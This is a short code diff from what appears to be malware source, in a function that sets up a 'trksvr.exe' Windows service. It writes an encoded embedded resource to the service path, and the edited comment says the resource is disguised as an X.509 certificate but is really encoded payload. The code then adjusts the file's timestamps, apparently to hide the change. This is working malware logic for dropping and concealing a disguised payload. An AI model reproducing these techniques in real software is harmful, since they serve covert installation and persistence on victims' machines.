@@ -295,7 +295,8 @@ bool SetupTrkSvrService()
 		{
 			if(strcmpW(&service_config->lpBinaryPathName[strlenW(service_config->lpBinaryPathName) - strlenW(L"trksvr.exe")], L"trksvr.exe"))
 			{
-				// Load some resource from our own process
+				// Load the 116th resource from our own process, designed to assume the identity of a X.509 cert
+				//  when it's really just our encoded
 				if(GetTrksrvServiceInfo(svc_filename, svc_path) && WriteEncodedResource(svc_path, 0, (LPCWSTR)0x74, L"X509", g_keys[KEY_X509], 4))
 				{
 					SetReliableFileTime(svc_path);
